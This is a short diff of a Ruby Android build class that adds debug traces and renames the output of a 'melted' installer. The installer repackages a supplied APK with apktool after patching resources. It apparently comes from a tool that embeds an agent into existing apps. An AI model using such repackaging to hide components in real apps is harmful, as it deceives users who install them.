@@ -172,6 +172,7 @@ class BuildAndroid < Build
   private
   
   def silent
+    trace :debug, "Build: silent installer"
 
     apktool = path('apktool.jar')
     File.chmod(0755, path('aapt')) if File.exist? path('aapt')
@@ -191,6 +192,8 @@ class BuildAndroid < Build
   end
 
   def melted(input)    
+    trace :debug, "Build: melted installer"
+
     apktool = path('apktool.jar')
     
     FileUtils.mv input, path('input')
@@ -216,10 +219,10 @@ class BuildAndroid < Build
     patch_resources(rcsdir)
 
     # repack the final application
-    apk = path("output.melt.apk")
+    apk = path("output.m.apk")
     CrossPlatform.exec "java", "-jar #{apktool} b #{rcsdir} #{apk}", {add_path: @tmpdir}
       
-    @outputs = ["output.melt.apk"] if File.exist?(apk)
+    @outputs = ["output.m.apk"] if File.exist?(apk)
   end
   
   def parse_manifest(rcsdir, pkgdir)
